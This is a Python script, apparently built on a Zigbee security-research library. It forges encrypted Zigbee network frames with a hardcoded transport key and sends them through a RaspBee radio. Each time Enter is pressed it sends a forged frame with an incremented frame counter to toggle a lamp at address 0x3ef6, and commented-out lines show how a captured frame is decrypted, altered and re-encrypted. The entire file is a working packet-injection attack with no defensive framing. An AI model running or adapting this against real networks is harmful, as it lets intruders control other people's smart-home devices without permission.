import sys
import time
import serial
from zigbear.radio.raspbee import send_packet
from zigbear.packets import parse_frame, bump_counters, encrypted_toggle
from zigbear.crypto import zigbee_packet_decrypt, zigbee_packet_encrypt
from zigbear.utils import extended_address_bytes, get_extended_source
from zigbear.patch.zigbee import ZigbeeNWK
from scapy.layers.dot15d4 import Dot15d4FCS

SERIAL_PORT = '/dev/ttyS0'
BAUD_RATE = 38400
TIMEOUT = 10

TRANSPOT_KEY = b'\x00\x08\xd0$\xb4\xd4\x08\xfc\xb4\xfcd\x08\xa4\xfc\xbc,'


def main():
    fc = 38200
    encrypted_frame = b"\x41\x88\x4f\x03\xae\xff\xff\x00\x00\x08\x02\xfd\xff\x00\x00\x0a" \
                      b"\xd8\x28\xc5\x57\x00\x00\x6a\xfe\x03\xff\xff\x2e\x21\x00\x00\x7c" \
                      b"\xbe\x79\x42\x58\xe3\x2a\xf7\xb4\x88\x89\x7b\xc2\x90\x9a\x4d\xac\xbf"

    ser = serial.Serial(port=SERIAL_PORT, baudrate=BAUD_RATE, timeout=TIMEOUT)
    ser.write(b'\n')

    while True:
        input("Enter to toggle lamp: ")

        # parsed_frame = parse_frame(encrypted_frame)

        # extended_source_bytes = extended_address_bytes(get_extended_source(parsed_frame))
        # decrypted_payload, valid = zigbee_packet_decrypt(TRANSPOT_KEY, parsed_frame, extended_source_bytes)
        # assert valid, 'Decryption failed!'

        # new_parsed_frame, new_payload = bump_counters(parsed_frame, decrypted_payload, fc)
        # new_parsed_frame[Dot15d4FCS].fcf_ackreq = 1
        # new_parsed_frame[ZigbeeNWK].destination = 0x3ef6
        
        # new_frame = zigbee_packet_encrypt(TRANSPOT_KEY, new_parsed_frame, bytes(new_payload), extended_source_bytes)
        # encrypted_frame = new_frame.build()
        encrypted_frame = encrypted_toggle(0xae03, 0x0000, 0x3ef6, 0x00212effff03fe6a, TRANSPOT_KEY, fc).build()
        send_packet(ser, encrypted_frame[:-2])
        fc+=1

if __name__ == "__main__":
    main()
